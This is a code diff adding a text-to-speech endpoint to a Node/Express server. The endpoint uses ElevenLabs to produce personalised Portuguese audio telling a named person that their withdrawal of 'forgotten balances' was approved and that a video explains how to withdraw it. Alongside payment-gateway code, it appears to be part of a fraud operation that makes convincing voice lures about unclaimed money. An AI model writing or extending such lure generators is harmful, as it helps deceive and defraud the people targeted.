@@ -806,6 +806,44 @@ app.get("/api/v1/version", (req, res) => {
   res.json({ version: "2.0.0", message: "Servidor atualizado com sucesso!" });
 });
 
+app.post("/api/v1/tts", async (req, res) => {
+  try {
+    const { name, value, voiceId } = req.body;
+    const firstName = name.split(' ')[0];
+    const text = `Parabéns, ${firstName}! A sua solicitação de saque foi aprovada no valor de ${value} referentes a saldos esquecidos. Assista ao vídeo abaixo para entender como realizar o saque.`;
+    
+    if (!process.env.ELEVENLABS_API_KEY) {
+      return res.status(500).json({ error: "Missing ElevenLabs API Key" });
+    }
+
+    const response = await axios.post(
+      `https://api.elevenlabs.io/v1/text-to-speech/${voiceId || 'EXAVITQu4vr4xnSDxMaL'}`, 
+      {
+        text,
+        model_id: "eleven_multilingual_v2",
+        voice_settings: {
+          stability: 0.5,
+          similarity_boost: 0.75
+        }
+      },
+      {
+        headers: {
+          "xi-api-key": process.env.ELEVENLABS_API_KEY,
+          "Content-Type": "application/json",
+          "Accept": "audio/mpeg"
+        },
+        responseType: "arraybuffer"
+      }
+    );
+    
+    const audioBase64 = Buffer.from(response.data, 'binary').toString('base64');
+    res.json({ audioBase64 });
+  } catch (e: any) {
+    console.error("TTS Error:", e?.response?.data?.toString() || e.message);
+    res.status(500).json({ error: "TTS failed" });
+  }
+});
+
 // ---------------------------
 
 async function getGatewayBalance() {
